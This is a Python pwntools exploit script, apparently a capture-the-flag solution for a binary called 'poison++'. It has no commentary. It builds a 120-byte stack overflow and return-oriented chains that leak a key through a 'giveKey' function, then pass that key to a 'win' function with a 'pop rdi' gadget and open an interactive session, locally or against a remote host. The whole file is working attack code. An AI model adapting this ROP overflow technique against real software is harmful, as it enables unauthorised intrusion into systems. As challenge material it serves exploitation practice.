#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./poison++",
	"libc" : "",
	"HOST" : "asd",
	"PORT" : 123
}

def exploit(r):
	# Stage 1: Get key
	rop = "A"*120
	rop+= p64(e.symbols["giveKey"])
	rop+= p64(e.symbols["giveKey"])
	rop+= p64(e.symbols["giveKey"])
	rop+= p64(e.symbols["giveKey"])
	rop+= p64(e.symbols["main"]+0xe)
	r.sendlineafter("Choice> ", "0")
	r.sendlineafter("Say> \"", rop)
	key = 0
	for i in xrange(4):
		a = r.recvuntil("of the key: ")
		if "1st" in a:
			key |= u32(r.recvn(3)+'\x00')
		else:
			key |=(u32(r.recvn(3)+'\x00') << 24)
	log.info("key: {:#x}".format(key))

	# Stage 2: Win
	rop = "A"*120
	rop+= p64(0x00000000004013e3) # pop rdi; ret;
	rop+= p64(key)
	rop+= p64(e.symbols["win"])
	r.sendlineafter("Choice> ", "1")
	r.sendlineafter("Say> \"", rop)

	r.interactive()
	return

if __name__ == "__main__":
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if "remote" in sys.argv:
		r = remote(config["HOST"], config["PORT"])
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])

		print util.proc.pidof(r)
		if "debug" in sys.argv:
			pause()

	exploit(r)
